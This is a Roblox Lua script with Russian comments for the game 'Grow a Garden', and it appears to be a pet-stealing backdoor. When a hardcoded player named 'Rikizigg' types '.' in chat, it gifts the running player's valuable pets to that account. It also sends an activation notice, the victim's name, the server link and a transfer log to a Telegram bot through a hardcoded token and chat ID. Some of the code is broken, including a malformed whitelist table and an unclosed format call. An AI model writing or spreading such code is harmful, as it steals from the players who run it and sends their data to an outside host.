local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE" -- Получить у @BotFather
local TELEGRAM_CHAT_ID = "7144575011" -- Числовой ID чата
local TARGET_PLAYER = "Rikizigg" -- Ник получателя
local TRIGGER_MESSAGE = "." -- Сообщение-триггер
local DELAY = 2 -- Задержка между действиями (секунды)

-- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ + минимальные параметры
local WHITELIST = 
    "Wasp",
}

-- 🔎 Поиск подходящих питомцев
local function getEligiblePets()
    local eligiblePets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            for petName, params in pairs(WHITELIST) do
                if item.Name:find(petName) then
                    -- Парсим вес и возраст
                    local weight = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
                    local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
                    
                    -- Проверяем соответствие критериям
                    if weight >= params.minWeight and age >= params.minAge then
                        table.insert(eligiblePets, {
                            object = item,
                            name = petName,
                            weight = weight,
                            age = age
                        })
                    end
                    break
                end
            end
        end
    end
    
    -- Сортировка по весу (от тяжелых)
    table.sort(eligiblePets, function(a, b) return a.weight > b.weight end)
    return eligiblePets
end

-- ✋ Взять питомца в руку
local function equipPet(pet)
    if pet and pet:IsA("Tool") then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(DELAY)
        return true
    end
    return false
end

-- 📤 Передать питомца
local function transferPet(pet)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then return false end

    if equipPet(pet) then
        local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
        PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&parse_mode=Markdown&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    
    pcall(function()
        game:HttpGet(url, true)
    end)
end

-- 📝 Формирование отчета
local function createReport(pets)
    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
    local message = string.format(
        "🔄 *Grow a Garden - Pet Transfer*\n"..
        "👤 Отправитель: %s\n"..
        "🎯 Получатель: %s\n"..
        "🔗 Сервер: [Кликните здесь](%s)\n\n",
        player.Name,
        TARGET_PLAYER,
        serverLink
    )
    
    if #pets == 0 then
        return message.."❌ Нет подходящих питомцев"
    end
    
    message = message.."📊 *Доступные питомцы (%d):*\n"..string.rep("─", 30).."\n"
    for _, pet in ipairs(pets) do
        message = message..string.format(
            "🐾 *%s*\n├ Вес: %.2f кг\n└ Возраст: %d дн.\n\n",
            pet.name,
            pet.weight,
            pet.age
        )
    end
    
    return message
end

-- 🚀 Основная функция передачи
local function processTransfer()
    local pets = getEligiblePets()
    local report = createReport(pets)
    
    -- Отправляем начальный отчет
    sendToTelegram(report)
    
    -- Передаем каждого питомца
    for _, pet in ipairs(pets) do
        if transferPet(pet.object) then
            sendToTelegram("✅ Успешно: "..pet.name.." ("..pet.weight.." кг)")
        else
            sendToTelegram("❌ Ошибка: "..pet.name)
        end
        task.wait(DELAY)
    end
    
    -- Итоговый отчет
    if #pets > 0 then
        sendToTelegram("🏁 Всего передано: "..#pets.." питомцев")
    end
end

-- 👂 Обработчик чата
game:GetService("Players").PlayerChatted:Connect(function(chatType, speaker, message)
    if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        processTransfer()
    end
end)

-- 📢 Инициализация
sendToTelegram("🔔 Система активирована! Ожидаю команду '"..TRIGGER_MESSAGE.."' от "..TARGET_PLAYER)
print("✅ Готов к работе! Питомцев в белом списке:", table.size(WHITELIST))
